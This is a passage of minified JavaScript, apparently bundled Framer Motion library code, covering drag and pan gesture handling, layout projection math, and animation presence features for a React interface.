    Hl(t) && (this.unmountControls = t.subscribe(this.node))
  }
  mount() {
    this.updateAnimationControlsSubscription()
  }
  update() {
    const {
      animate: t
    } = this.node.getProps(), {
      animate: n
    } = this.node.prevProps || {};
    t !== n && this.updateAnimationControlsSubscription()
  }
  unmount() {
    var t;
    this.node.animationState.reset(), (t = this.unmountControls) === null || t === void 0 || t.call(this)
  }
}
let a4 = 0;
class l4 extends xr {
  constructor() {
    super(...arguments), this.id = a4++
  }
  update() {
    if (!this.node.presenceContext) return;
    const {
      isPresent: t,
      onExitComplete: n
    } = this.node.presenceContext, {
      isPresent: r
    } = this.node.prevPresenceContext || {};
    if (!this.node.animationState || t === r) return;
    const s = this.node.animationState.setActive("exit", !t);
    n && !t && s.then(() => n(this.id))
  }
  mount() {
    const {
      register: t
    } = this.node.presenceContext || {};
    t && (this.unmount = t(this.id))
  }
  unmount() { }
}
const c4 = {
  animation: {
    Feature: i4
  },
  exit: {
    Feature: l4
  }
};

function u4(e, t, n) {
  var r;
  if (e instanceof Element) return [e];
  if (typeof e == "string") {
    let s = document;
    const o = (r = void 0) !== null && r !== void 0 ? r : s.querySelectorAll(e);
    return o ? Array.from(o) : []
  }
  return Array.from(e)
}
const Bt = {
  x: !1,
  y: !1
};

function N1() {
  return Bt.x || Bt.y
}

function Lp(e) {
  return t => {
    t.pointerType === "touch" || N1() || e(t)
  }
}

function d4(e, t, n = {}) {
  const r = new AbortController,
    s = {
      passive: !0,
      ...n,
      signal: r.signal
    },
    o = Lp(i => {
      const {
        target: a
      } = i, c = t(i);
      if (!c || !a) return;
      const u = Lp(d => {
        c(d), a.removeEventListener("pointerleave", u)
      });
      a.addEventListener("pointerleave", u, s)
    });
  return u4(e).forEach(i => {
    i.addEventListener("pointerenter", o, s)
  }), () => r.abort()
}

function f4(e) {
  return e === "x" || e === "y" ? Bt[e] ? null : (Bt[e] = !0, () => {
    Bt[e] = !1
  }) : Bt.x || Bt.y ? null : (Bt.x = Bt.y = !0, () => {
    Bt.x = Bt.y = !1
  })
}
const j1 = e => e.pointerType === "mouse" ? typeof e.button != "number" || e.button <= 0 : e.isPrimary !== !1;

function Ti(e) {
  return {
    point: {
      x: e.pageX,
      y: e.pageY
    }
  }
}
const h4 = e => t => j1(t) && e(t, Ti(t));

function Cn(e, t, n, r = {
  passive: !0
}) {
  return e.addEventListener(t, n, r), () => e.removeEventListener(t, n)
}

function ur(e, t, n, r) {
  return Cn(e, t, h4(n), r)
}
const Op = (e, t) => Math.abs(e - t);

function m4(e, t) {
  const n = Op(e.x, t.x),
    r = Op(e.y, t.y);
  return Math.sqrt(n ** 2 + r ** 2)
}
class A1 {
  constructor(t, n, {
    transformPagePoint: r,
    contextWindow: s,
    dragSnapToOrigin: o = !1
  } = {}) {
    if (this.startEvent = null, this.lastMoveEvent = null, this.lastMoveEventInfo = null, this.handlers = {}, this.contextWindow = window, this.updatePoint = () => {
      if (!(this.lastMoveEvent && this.lastMoveEventInfo)) return;
      const f = Jc(this.lastMoveEventInfo, this.history),
        h = this.startEvent !== null,
        y = m4(f.offset, {
          x: 0,
          y: 0
        }) >= 3;
      if (!h && !y) return;
      const {
        point: w
      } = f, {
        timestamp: v
      } = Fe;
      this.history.push({
        ...w,
        timestamp: v
      });
      const {
        onStart: S,
        onMove: g
      } = this.handlers;
      h || (S && S(this.lastMoveEvent, f), this.startEvent = this.lastMoveEvent), g && g(this.lastMoveEvent, f)
    }, this.handlePointerMove = (f, h) => {
      this.lastMoveEvent = f, this.lastMoveEventInfo = Xc(h, this.transformPagePoint), ue.update(this.updatePoint, !0)
    }, this.handlePointerUp = (f, h) => {
      this.end();
      const {
        onEnd: y,
        onSessionEnd: w,
        resumeAnimation: v
      } = this.handlers;
      if (this.dragSnapToOrigin && v && v(), !(this.lastMoveEvent && this.lastMoveEventInfo)) return;
      const S = Jc(f.type === "pointercancel" ? this.lastMoveEventInfo : Xc(h, this.transformPagePoint), this.history);
      this.startEvent && y && y(f, S), w && w(f, S)
    }, !j1(t)) return;
    this.dragSnapToOrigin = o, this.handlers = n, this.transformPagePoint = r, this.contextWindow = s || window;
    const i = Ti(t),
      a = Xc(i, this.transformPagePoint),
      {
        point: c
      } = a,
      {
        timestamp: u
      } = Fe;
    this.history = [{
      ...c,
      timestamp: u
    }];
    const {
      onSessionStart: d
    } = n;
    d && d(t, Jc(a, this.history)), this.removeListeners = cr(ur(this.contextWindow, "pointermove", this.handlePointerMove), ur(this.contextWindow, "pointerup", this.handlePointerUp), ur(this.contextWindow, "pointercancel", this.handlePointerUp))
  }
  updateHandlers(t) {
    this.handlers = t
  }
  end() {
    this.removeListeners && this.removeListeners(), hr(this.updatePoint)
  }
}

function Xc(e, t) {
  return t ? {
    point: t(e.point)
  } : e
}

function Fp(e, t) {
  return {
    x: e.x - t.x,
    y: e.y - t.y
  }
}

function Jc({
  point: e
}, t) {
  return {
    point: e,
    delta: Fp(e, P1(t)),
    offset: Fp(e, p4(t)),
    velocity: g4(t, .1)
  }
}

function p4(e) {
  return e[0]
}

function P1(e) {
  return e[e.length - 1]
}

function g4(e, t) {
  if (e.length < 2) return {
    x: 0,
    y: 0
  };
  let n = e.length - 1,
    r = null;
  const s = P1(e);
  for (; n >= 0 && (r = e[n], !(s.timestamp - r.timestamp > An(t)));) n--;
  if (!r) return {
    x: 0,
    y: 0
  };
  const o = Pn(s.timestamp - r.timestamp);
  if (o === 0) return {
    x: 0,
    y: 0
  };
  const i = {
    x: (s.x - r.x) / o,
    y: (s.y - r.y) / o
  };
  return i.x === 1 / 0 && (i.x = 0), i.y === 1 / 0 && (i.y = 0), i
}

function ms(e) {
  return e && typeof e == "object" && Object.prototype.hasOwnProperty.call(e, "current")
}
const E1 = 1e-4,
  y4 = 1 - E1,
  v4 = 1 + E1,
  T1 = .01,
  x4 = 0 - T1,
  w4 = 0 + T1;

function bt(e) {
  return e.max - e.min
}

function b4(e, t, n) {
  return Math.abs(e - t) <= n
}

function Vp(e, t, n, r = .5) {
  e.origin = r, e.originPoint = xe(t.min, t.max, e.origin), e.scale = bt(n) / bt(t), e.translate = xe(n.min, n.max, e.origin) - e.originPoint, (e.scale >= y4 && e.scale <= v4 || isNaN(e.scale)) && (e.scale = 1), (e.translate >= x4 && e.translate <= w4 || isNaN(e.translate)) && (e.translate = 0)
}

function zo(e, t, n, r) {
  Vp(e.x, t.x, n.x, r ? r.originX : void 0), Vp(e.y, t.y, n.y, r ? r.originY : void 0)
}

function Bp(e, t, n) {
  e.min = n.min + t.min, e.max = e.min + bt(t)
}

function S4(e, t, n) {
  Bp(e.x, t.x, n.x), Bp(e.y, t.y, n.y)
}

function zp(e, t, n) {
  e.min = t.min - n.min, e.max = e.min + bt(t)
}

function Uo(e, t, n) {
  zp(e.x, t.x, n.x), zp(e.y, t.y, n.y)
}

function C4(e, {
  min: t,
  max: n
}, r) {
  return t !== void 0 && e < t ? e = r ? xe(t, e, r.min) : Math.max(e, t) : n !== void 0 && e > n && (e = r ? xe(n, e, r.max) : Math.min(e, n)), e
}

function Up(e, t, n) {
  return {
    min: t !== void 0 ? e.min + t : void 0,
    max: n !== void 0 ? e.max + n - (e.max - e.min) : void 0
  }
}

function N4(e, {
  top: t,
  left: n,
  bottom: r,
  right: s
}) {
  return {
    x: Up(e.x, n, s),
    y: Up(e.y, t, r)
  }
}

function $p(e, t) {
  let n = t.min - e.min,
    r = t.max - e.max;
  return t.max - t.min < e.max - e.min && ([n, r] = [r, n]), {
    min: n,
    max: r
  }
}

function j4(e, t) {
  return {
    x: $p(e.x, t.x),
    y: $p(e.y, t.y)
  }
}

function A4(e, t) {
  let n = .5;
  const r = bt(e),
    s = bt(t);
  return s > r ? n = Qs(t.min, t.max - r, e.min) : r > s && (n = Qs(e.min, e.max - s, t.min)), Mn(0, 1, n)
}

function P4(e, t) {
  const n = {};
  return t.min !== void 0 && (n.min = t.min - e.min), t.max !== void 0 && (n.max = t.max - e.min), n
}
const Sd = .35;

function E4(e = Sd) {
  return e === !1 ? e = 0 : e === !0 && (e = Sd), {
    x: Hp(e, "left", "right"),
    y: Hp(e, "top", "bottom")
  }
}

function Hp(e, t, n) {
  return {
    min: Wp(e, t),
    max: Wp(e, n)
  }
}

function Wp(e, t) {
  return typeof e == "number" ? e : e[t] || 0
}
const Kp = () => ({
  translate: 0,
  scale: 1,
  origin: 0,
  originPoint: 0
}),
  ps = () => ({
    x: Kp(),
    y: Kp()
  }),
  Qp = () => ({
    min: 0,
    max: 0
  }),
  je = () => ({
    x: Qp(),
    y: Qp()
  });

function Tt(e) {
  return [e("x"), e("y")]
}

function k1({
  top: e,
  left: t,
  right: n,
  bottom: r
}) {
  return {
    x: {
      min: t,
      max: n
    },
    y: {
      min: e,
      max: r
    }
  }
}

function T4({
  x: e,
  y: t
}) {
  return {
    top: t.min,
    right: e.max,
    bottom: t.max,
    left: e.min
  }
}

function k4(e, t) {
  if (!t) return e;
  const n = t({
    x: e.left,
    y: e.top
  }),
    r = t({
      x: e.right,
      y: e.bottom
    });
  return {
    top: n.y,
    left: n.x,
    bottom: r.y,
    right: r.x
  }
}

function Zc(e) {
  return e === void 0 || e === 1
}

function Cd({
  scale: e,
  scaleX: t,
  scaleY: n
}) {
  return !Zc(e) || !Zc(t) || !Zc(n)
}

function jr(e) {
  return Cd(e) || R1(e) || e.z || e.rotate || e.rotateX || e.rotateY || e.skewX || e.skewY
}

function R1(e) {
  return Gp(e.x) || Gp(e.y)
}

function Gp(e) {
  return e && e !== "0%"
}

function dl(e, t, n) {
  const r = e - n,
    s = t * r;
  return n + s
}

function qp(e, t, n, r, s) {
  return s !== void 0 && (e = dl(e, s, r)), dl(e, n, r) + t
}

function Nd(e, t = 0, n = 1, r, s) {
  e.min = qp(e.min, t, n, r, s), e.max = qp(e.max, t, n, r, s)
}

function D1(e, {
  x: t,
  y: n
}) {
  Nd(e.x, t.translate, t.scale, t.originPoint), Nd(e.y, n.translate, n.scale, n.originPoint)
}
const Yp = .999999999999,
  Xp = 1.0000000000001;

function R4(e, t, n, r = !1) {
  const s = n.length;
  if (!s) return;
  t.x = t.y = 1;
  let o, i;
  for (let a = 0; a < s; a++) {
    o = n[a], i = o.projectionDelta;
    const {
      visualElement: c
    } = o.options;
    c && c.props.style && c.props.style.display === "contents" || (r && o.options.layoutScroll && o.scroll && o !== o.root && ys(e, {
      x: -o.scroll.offset.x,
      y: -o.scroll.offset.y
    }), i && (t.x *= i.x.scale, t.y *= i.y.scale, D1(e, i)), r && jr(o.latestValues) && ys(e, o.latestValues))
  }
  t.x < Xp && t.x > Yp && (t.x = 1), t.y < Xp && t.y > Yp && (t.y = 1)
}

function gs(e, t) {
  e.min = e.min + t, e.max = e.max + t
}

function Jp(e, t, n, r, s = .5) {
  const o = xe(e.min, e.max, s);
  Nd(e, t, n, o, r)
}

function ys(e, t) {
  Jp(e.x, t.x, t.scaleX, t.scale, t.originX), Jp(e.y, t.y, t.scaleY, t.scale, t.originY)
}

function M1(e, t) {
  return k1(k4(e.getBoundingClientRect(), t))
}

function D4(e, t, n) {
  const r = M1(e, n),
    {
      scroll: s
    } = t;
  return s && (gs(r.x, s.offset.x), gs(r.y, s.offset.y)), r
}
const _1 = ({
  current: e
}) => e ? e.ownerDocument.defaultView : null,
  M4 = new WeakMap;
class _4 {
  constructor(t) {
    this.openDragLock = null, this.isDragging = !1, this.currentDirection = null, this.originPoint = {
      x: 0,
      y: 0
    }, this.constraints = !1, this.hasMutatedConstraints = !1, this.elastic = je(), this.visualElement = t
  }
  start(t, {
    snapToCursor: n = !1
  } = {}) {
    const {
      presenceContext: r
    } = this.visualElement;
    if (r && r.isPresent === !1) return;
    const s = d => {
      const {
        dragSnapToOrigin: f
      } = this.getProps();
      f ? this.pauseAnimation() : this.stopAnimation(), n && this.snapToCursor(Ti(d).point)
    },
      o = (d, f) => {
        const {
          drag: h,
          dragPropagation: y,
          onDragStart: w
        } = this.getProps();
        if (h && !y && (this.openDragLock && this.openDragLock(), this.openDragLock = f4(h), !this.openDragLock)) return;
        this.isDragging = !0, this.currentDirection = null, this.resolveConstraints(), this.visualElement.projection && (this.visualElement.projection.isAnimationBlocked = !0, this.visualElement.projection.target = void 0), Tt(S => {
          let g = this.getAxisMotionValue(S).get() || 0;
          if (an.test(g)) {
            const {
              projection: p
            } = this.visualElement;
            if (p && p.layout) {
              const m = p.layout.layoutBox[S];
              m && (g = bt(m) * (parseFloat(g) / 100))
            }
          }
          this.originPoint[S] = g
        }), w && ue.postRender(() => w(d, f)), wd(this.visualElement, "transform");
        const {
          animationState: v
        } = this.visualElement;
        v && v.setActive("whileDrag", !0)
      },
      i = (d, f) => {
        const {
          dragPropagation: h,
          dragDirectionLock: y,
          onDirectionLock: w,
          onDrag: v
        } = this.getProps();
        if (!h && !this.openDragLock) return;
        const {
          offset: S
        } = f;
        if (y && this.currentDirection === null) {
          this.currentDirection = I4(S), this.currentDirection !== null && w && w(this.currentDirection);
          return
        }
        this.updateAxis("x", f.point, S), this.updateAxis("y", f.point, S), this.visualElement.render(), v && v(d, f)
      },
      a = (d, f) => this.stop(d, f),
      c = () => Tt(d => {
        var f;
        return this.getAnimationState(d) === "paused" && ((f = this.getAxisMotionValue(d).animation) === null || f === void 0 ? void 0 : f.play())
      }),
      {
        dragSnapToOrigin: u
      } = this.getProps();
    this.panSession = new A1(t, {
      onSessionStart: s,
      onStart: o,
      onMove: i,
      onSessionEnd: a,
      resumeAnimation: c
    }, {
      transformPagePoint: this.visualElement.getTransformPagePoint(),
      dragSnapToOrigin: u,
      contextWindow: _1(this.visualElement)
    })
  }
  stop(t, n) {
    const r = this.isDragging;
    if (this.cancel(), !r) return;
    const {
      velocity: s
    } = n;
    this.startAnimation(s);
    const {
      onDragEnd: o
    } = this.getProps();
    o && ue.postRender(() => o(t, n))
  }
  cancel() {
    this.isDragging = !1;
    const {
      projection: t,
      animationState: n
    } = this.visualElement;
    t && (t.isAnimationBlocked = !1), this.panSession && this.panSession.end(), this.panSession = void 0;
    const {
      dragPropagation: r
    } = this.getProps();
    !r && this.openDragLock && (this.openDragLock(), this.openDragLock = null), n && n.setActive("whileDrag", !1)
  }
  updateAxis(t, n, r) {
    const {
      drag: s
    } = this.getProps();
    if (!r || !ca(t, s, this.currentDirection)) return;
    const o = this.getAxisMotionValue(t);
    let i = this.originPoint[t] + r[t];
    this.constraints && this.constraints[t] && (i = C4(i, this.constraints[t], this.elastic[t])), o.set(i)
  }
  resolveConstraints() {
    var t;
    const {
      dragConstraints: n,
      dragElastic: r
    } = this.getProps(), s = this.visualElement.projection && !this.visualElement.projection.layout ? this.visualElement.projection.measure(!1) : (t = this.visualElement.projection) === null || t === void 0 ? void 0 : t.layout, o = this.constraints;
    n && ms(n) ? this.constraints || (this.constraints = this.resolveRefConstraints()) : n && s ? this.constraints = N4(s.layoutBox, n) : this.constraints = !1, this.elastic = E4(r), o !== this.constraints && s && this.constraints && !this.hasMutatedConstraints && Tt(i => {
      this.constraints !== !1 && this.getAxisMotionValue(i) && (this.constraints[i] = P4(s.layoutBox[i], this.constraints[i]))
    })
  }
  resolveRefConstraints() {
    const {
      dragConstraints: t,
      onMeasureDragConstraints: n
    } = this.getProps();
    if (!t || !ms(t)) return !1;
    const r = t.current,
      {
        projection: s
      } = this.visualElement;
    if (!s || !s.layout) return !1;
    const o = D4(r, s.root, this.visualElement.getTransformPagePoint());
    let i = j4(s.layout.layoutBox, o);
    if (n) {
      const a = n(T4(i));
      this.hasMutatedConstraints = !!a, a && (i = k1(a))
    }
    return i
  }
  startAnimation(t) {
    const {
      drag: n,
      dragMomentum: r,
      dragElastic: s,
      dragTransition: o,
      dragSnapToOrigin: i,
      onDragTransitionEnd: a
    } = this.getProps(), c = this.constraints || {}, u = Tt(d => {
      if (!ca(d, n, this.currentDirection)) return;
      let f = c && c[d] || {};
      i && (f = {
        min: 0,
        max: 0
      });
      const h = s ? 200 : 1e6,
        y = s ? 40 : 1e7,
        w = {
          type: "inertia",
          velocity: r ? t[d] : 0,
          bounceStiffness: h,
          bounceDamping: y,
          timeConstant: 750,
          restDelta: 1,
          restSpeed: 10,
          ...o,
          ...f
        };
      return this.startAxisValueAnimation(d, w)
    });
    return Promise.all(u).then(a)
  }
  startAxisValueAnimation(t, n) {
    const r = this.getAxisMotionValue(t);
    return wd(this.visualElement, t), r.start(rh(t, r, 0, n, this.visualElement, !1))
  }
  stopAnimation() {
    Tt(t => this.getAxisMotionValue(t).stop())
  }
  pauseAnimation() {
    Tt(t => {
      var n;
      return (n = this.getAxisMotionValue(t).animation) === null || n === void 0 ? void 0 : n.pause()
    })
  }
  getAnimationState(t) {
    var n;
    return (n = this.getAxisMotionValue(t).animation) === null || n === void 0 ? void 0 : n.state
  }
  getAxisMotionValue(t) {
    const n = `_drag${t.toUpperCase()}`,
      r = this.visualElement.getProps(),
      s = r[n];
    return s || this.visualElement.getValue(t, (r.initial ? r.initial[t] : void 0) || 0)
  }
  snapToCursor(t) {
    Tt(n => {
      const {
        drag: r
      } = this.getProps();
      if (!ca(n, r, this.currentDirection)) return;
      const {
        projection: s
      } = this.visualElement, o = this.getAxisMotionValue(n);
      if (s && s.layout) {
        const {
          min: i,
          max: a
        } = s.layout.layoutBox[n];
        o.set(t[n] - xe(i, a, .5))
      }
    })
  }
  scalePositionWithinConstraints() {
    if (!this.visualElement.current) return;
    const {
      drag: t,
      dragConstraints: n
    } = this.getProps(), {
      projection: r
    } = this.visualElement;
    if (!ms(n) || !r || !this.constraints) return;
    this.stopAnimation();
    const s = {
      x: 0,
      y: 0
    };
    Tt(i => {
      const a = this.getAxisMotionValue(i);
      if (a && this.constraints !== !1) {
        const c = a.get();
        s[i] = A4({
          min: c,
          max: c
        }, this.constraints[i])
      }
    });
    const {
      transformTemplate: o
    } = this.visualElement.getProps();
    this.visualElement.current.style.transform = o ? o({}, "") : "none", r.root && r.root.updateScroll(), r.updateLayout(), this.resolveConstraints(), Tt(i => {
      if (!ca(i, t, null)) return;
      const a = this.getAxisMotionValue(i),
        {
          min: c,
          max: u
        } = this.constraints[i];
      a.set(xe(c, u, s[i]))
    })
  }
  addListeners() {
    if (!this.visualElement.current) return;
    M4.set(this.visualElement, this);
    const t = this.visualElement.current,
      n = ur(t, "pointerdown", c => {
        const {
          drag: u,
          dragListener: d = !0
        } = this.getProps();
        u && d && this.start(c)
      }),
      r = () => {
        const {
          dragConstraints: c
        } = this.getProps();
        ms(c) && c.current && (this.constraints = this.resolveRefConstraints())
      },
      {
        projection: s
      } = this.visualElement,
      o = s.addEventListener("measure", r);
    s && !s.layout && (s.root && s.root.updateScroll(), s.updateLayout()), ue.read(r);
    const i = Cn(window, "resize", () => this.scalePositionWithinConstraints()),
      a = s.addEventListener("didUpdate", ({
        delta: c,
        hasLayoutChanged: u
      }) => {
        this.isDragging && u && (Tt(d => {
          const f = this.getAxisMotionValue(d);
          f && (this.originPoint[d] += c[d].translate, f.set(f.get() + c[d].translate))
        }), this.visualElement.render())
      });
    return () => {
      i(), n(), o(), a && a()
    }
  }
  getProps() {
    const t = this.visualElement.getProps(),
      {
        drag: n = !1,
        dragDirectionLock: r = !1,
        dragPropagation: s = !1,
        dragConstraints: o = !1,
        dragElastic: i = Sd,
        dragMomentum: a = !0
      } = t;
    return {
      ...t,
      drag: n,
      dragDirectionLock: r,
      dragPropagation: s,
      dragConstraints: o,
      dragElastic: i,
      dragMomentum: a
    }
  }
}

function ca(e, t, n) {
  return (t === !0 || t === e) && (n === null || n === e)
}

function I4(e, t = 10) {
  let n = null;
  return Math.abs(e.y) > t ? n = "y" : Math.abs(e.x) > t && (n = "x"), n
}
class L4 extends xr {
  constructor(t) {
    super(t), this.removeGroupControls = Ye, this.removeListeners = Ye, this.controls = new _4(t)
  }
  mount() {
    const {
      dragControls: t
    } = this.node.getProps();
    t && (this.removeGroupControls = t.subscribe(this.controls)), this.removeListeners = this.controls.addListeners() || Ye
  }
  unmount() {
    this.removeGroupControls(), this.removeListeners()
  }
}
const Zp = e => (t, n) => {
  e && ue.postRender(() => e(t, n))
};
class O4 extends xr {
  constructor() {
    super(...arguments), this.removePointerDownListener = Ye
  }
  onPointerDown(t) {
    this.session = new A1(t, this.createPanHandlers(), {
      transformPagePoint: this.node.getTransformPagePoint(),
      contextWindow: _1(this.node)
    })
  }
  createPanHandlers() {
    const {
      onPanSessionStart: t,
      onPanStart: n,
      onPan: r,
      onPanEnd: s
    } = this.node.getProps();
    return {
      onSessionStart: Zp(t),
      onStart: Zp(n),
      onMove: r,
      onEnd: (o, i) => {
        delete this.session, s && ue.postRender(() => s(o, i))
      }
    }
  }
  mount() {
    this.removePointerDownListener = ur(this.node.current, "pointerdown", t => this.onPointerDown(t))
  }
  update() {
    this.session && this.session.updateHandlers(this.createPanHandlers())
  }
  unmount() {
    this.removePointerDownListener(), this.session && this.session.end()
  }
}
const Ql = x.createContext(null);

function F4() {
  const e = x.useContext(Ql);
  if (e === null) return [!0, null];
  const {
    isPresent: t,
    onExitComplete: n,
    register: r
  } = e, s = x.useId();
  x.useEffect(() => r(s), []);
  const o = x.useCallback(() => n && n(s), [s, n]);
  return !t && n ? [!1, o] : [!0]
}
const lh = x.createContext({}),
  I1 = x.createContext({}),
  Ea = {
    hasAnimatedSinceResize: !0,
    hasEverUpdated: !1
  };

function eg(e, t) {
  return t.max === t.min ? 0 : e / (t.max - t.min) * 100
}
const wo = {
  correct: (e, t) => {
    if (!t.target) return e;
    if (typeof e == "string")
      if (q.test(e)) e = parseFloat(e);
      else return e;
    const n = eg(e, t.target.x),
      r = eg(e, t.target.y);
    return `${n}% ${r}%`
  }
},
  V4 = {
    correct: (e, {
      treeScale: t,
      projectionDelta: n
    }) => {
      const r = e,
        s = mr.parse(e);
      if (s.length > 5) return r;
      const o = mr.createTransformer(e),
        i = typeof s[0] != "number" ? 1 : 0,
        a = n.x.scale * t.x,
        c = n.y.scale * t.y;
      s[0 + i] /= a, s[1 + i] /= c;
      const u = xe(a, c, .5);
      return typeof s[2 + i] == "number" && (s[2 + i] /= u), typeof s[3 + i] == "number" && (s[3 + i] /= u), o(s)
    }
  },
  fl = {};

function B4(e) {
  Object.assign(fl, e)
}
const {
  schedule: ch,
  cancel: pT
} = Ox(queueMicrotask, !1);
class z4 extends x.Component {
  componentDidMount() {
    const {
      visualElement: t,
      layoutGroup: n,
      switchLayoutGroup: r,
      layoutId: s
    } = this.props, {
      projection: o
    } = t;
    B4(U4), o && (n.group && n.group.add(o), r && r.register && s && r.register(o), o.root.didUpdate(), o.addEventListener("animationComplete", () => {
      this.safeToRemove()
    }), o.setOptions({
      ...o.options,
      onExitComplete: () => this.safeToRemove()
    })), Ea.hasEverUpdated = !0
  }
  getSnapshotBeforeUpdate(t) {
    const {
      layoutDependency: n,
      visualElement: r,
      drag: s,
      isPresent: o
    } = this.props, i = r.projection;
    return i && (i.isPresent = o, s || t.layoutDependency !== n || n === void 0 ? i.willUpdate() : this.safeToRemove(), t.isPresent !== o && (o ? i.promote() : i.relegate() || ue.postRender(() => {
      const a = i.getStack();
      (!a || !a.members.length) && this.safeToRemove()
    }))), null
  }
  componentDidUpdate() {
    const {
      projection: t
    } = this.props.visualElement;
    t && (t.root.didUpdate(), ch.postRender(() => {
      !t.currentAnimation && t.isLead() && this.safeToRemove()
    }))
  }
  componentWillUnmount() {
    const {
      visualElement: t,
      layoutGroup: n,
      switchLayoutGroup: r
    } = this.props, {
      projection: s
    } = t;
    s && (s.scheduleCheckAfterUnmount(), n && n.group && n.group.remove(s), r && r.deregister && r.deregister(s))
  }
  safeToRemove() {
    const {
      safeToRemove: t
    } = this.props;
    t && t()
  }
  render() {
    return null
  }
}

function L1(e) {
  const [t, n] = F4(), r = x.useContext(lh);
  return l.jsx(z4, {
    ...e,
    layoutGroup: r,
    switchLayoutGroup: x.useContext(I1),
    isPresent: t,
    safeToRemove: n
  })
}
const U4 = {
  borderRadius: {
    ...wo,
    applyTo: ["borderTopLeftRadius", "borderTopRightRadius", "borderBottomLeftRadius", "borderBottomRightRadius"]
  },
  borderTopLeftRadius: wo,
  borderTopRightRadius: wo,
  borderBottomLeftRadius: wo,
  borderBottomRightRadius: wo,
  boxShadow: V4
},
  O1 = ["TopLeft", "TopRight", "BottomLeft", "BottomRight"],
  $4 = O1.length,
  tg = e => typeof e == "string" ? parseFloat(e) : e,
  ng = e => typeof e == "number" || q.test(e);

function H4(e, t, n, r, s, o) {
  s ? (e.opacity = xe(0, n.opacity !== void 0 ? n.opacity : 1, W4(r)), e.opacityExit = xe(t.opacity !== void 0 ? t.opacity : 1, 0, K4(r))) : o && (e.opacity = xe(t.opacity !== void 0 ? t.opacity : 1, n.opacity !== void 0 ? n.opacity : 1, r));
  for (let i = 0; i < $4; i++) {
    const a = `border${O1[i]}Radius`;
    let c = rg(t, a),
      u = rg(n, a);
    if (c === void 0 && u === void 0) continue;
    c || (c = 0), u || (u = 0), c === 0 || u === 0 || ng(c) === ng(u) ? (e[a] = Math.max(xe(tg(c), tg(u), r), 0), (an.test(u) || an.test(c)) && (e[a] += "%")) : e[a] = u
  } (t.rotate || n.rotate) && (e.rotate = xe(t.rotate || 0, n.rotate || 0, r))
}

function rg(e, t) {
  return e[t] !== void 0 ? e[t] : e.borderRadius
}
const W4 = F1(0, .5, Hx),
  K4 = F1(.5, .95, Ye);

function F1(e, t, n) {
  return r => r < e ? 0 : r > t ? 1 : n(Qs(e, t, r))
}

function sg(e, t) {
  e.min = t.min, e.max = t.max
}

function Pt(e, t) {
  sg(e.x, t.x), sg(e.y, t.y)
}

function og(e, t) {
  e.translate = t.translate, e.scale = t.scale, e.originPoint = t.originPoint, e.origin = t.origin
}

function ig(e, t, n, r, s) {
  return e -= t, e = dl(e, 1 / n, r), s !== void 0 && (e = dl(e, 1 / s, r)), e
}

function Q4(e, t = 0, n = 1, r = .5, s, o = e, i = e) {
  if (an.test(t) && (t = parseFloat(t), t = xe(i.min, i.max, t / 100) - i.min), typeof t != "number") return;
  let a = xe(o.min, o.max, r);
  e === o && (a -= t), e.min = ig(e.min, t, n, a, s), e.max = ig(e.max, t, n, a, s)
}

function ag(e, t, [n, r, s], o, i) {
  Q4(e, t[n], t[r], t[s], t.scale, o, i)
}
const G4 = ["x", "scaleX", "originX"],
  q4 = ["y", "scaleY", "originY"];

function lg(e, t, n, r) {
  ag(e.x, t, G4, n ? n.x : void 0, r ? r.x : void 0), ag(e.y, t, q4, n ? n.y : void 0, r ? r.y : void 0)
}

function cg(e) {
  return e.translate === 0 && e.scale === 1
}

function V1(e) {
  return cg(e.x) && cg(e.y)
}

function ug(e, t) {
  return e.min === t.min && e.max === t.max
}

function Y4(e, t) {
  return ug(e.x, t.x) && ug(e.y, t.y)
}

function dg(e, t) {
  return Math.round(e.min) === Math.round(t.min) && Math.round(e.max) === Math.round(t.max)
}

function B1(e, t) {
  return dg(e.x, t.x) && dg(e.y, t.y)
}

function fg(e) {
  return bt(e.x) / bt(e.y)
}

function hg(e, t) {
  return e.translate === t.translate && e.scale === t.scale && e.originPoint === t.originPoint
}
class X4 {
  constructor() {
    this.members = []
  }
  add(t) {
    sh(this.members, t), t.scheduleRender()
  }
  remove(t) {
    if (oh(this.members, t), t === this.prevLead && (this.prevLead = void 0), t === this.lead) {
      const n = this.members[this.members.length - 1];
      n && this.promote(n)
    }
  }
  relegate(t) {
    const n = this.members.findIndex(s => t === s);
    if (n === 0) return !1;
    let r;
    for (let s = n; s >= 0; s--) {
      const o = this.members[s];
      if (o.isPresent !== !1) {
        r = o;
        break
      }
    }
    return r ? (this.promote(r), !0) : !1
  }
  promote(t, n) {
    const r = this.lead;
    if (t !== r && (this.prevLead = r, this.lead = t, t.show(), r)) {
      r.instance && r.scheduleRender(), t.scheduleRender(), t.resumeFrom = r, n && (t.resumeFrom.preserveOpacity = !0), r.snapshot && (t.snapshot = r.snapshot, t.snapshot.latestValues = r.animationValues || r.latestValues), t.root && t.root.isUpdating && (t.isLayoutDirty = !0);
      const {
        crossfade: s
      } = t.options;
      s === !1 && r.hide()
    }
  }
  exitAnimationComplete() {
    this.members.forEach(t => {
      const {
        options: n,
        resumingFrom: r
      } = t;
      n.onExitComplete && n.onExitComplete(), r && r.options.onExitComplete && r.options.onExitComplete()
    })
  }
  scheduleRender() {
    this.members.forEach(t => {
      t.instance && t.scheduleRender(!1)
    })
  }
  removeLeadSnapshot() {
    this.lead && this.lead.snapshot && (this.lead.snapshot = void 0)
  }
}

function J4(e, t, n) {
  let r = "";
  const s = e.x.translate / t.x,
    o = e.y.translate / t.y,
    i = (n == null ? void 0 : n.z) || 0;
  if ((s || o || i) && (r = `translate3d(${s}px, ${o}px, ${i}px) `), (t.x !== 1 || t.y !== 1) && (r += `scale(${1 / t.x}, ${1 / t.y}) `), n) {
    const {
      transformPerspective: u,
      rotate: d,
      rotateX: f,
      rotateY: h,
      skewX: y,
      skewY: w
    } = n;
    u && (r = `perspective(${u}px) ${r}`), d && (r += `rotate(${d}deg) `), f && (r += `rotateX(${f}deg) `), h && (r += `rotateY(${h}deg) `), y && (r += `skewX(${y}deg) `), w && (r += `skewY(${w}deg) `)
  }
  const a = e.x.scale * t.x,
    c = e.y.scale * t.y;
  return (a !== 1 || c !== 1) && (r += `scale(${a}, ${c})`), r || "none"
}
const Z4 = (e, t) => e.depth - t.depth;
class eP {
  constructor() {
    this.children = [], this.isDirty = !1
  }
  add(t) {
    sh(this.children, t), this.isDirty = !0
  }
  remove(t) {
    oh(this.children, t), this.isDirty = !0
  }
  forEach(t) {
    this.isDirty && this.children.sort(Z4), this.isDirty = !1, this.children.forEach(t)
  }
}

function Ta(e) {
  const t = qe(e) ? e.get() : e;
  return UA(t) ? t.toValue() : t
}

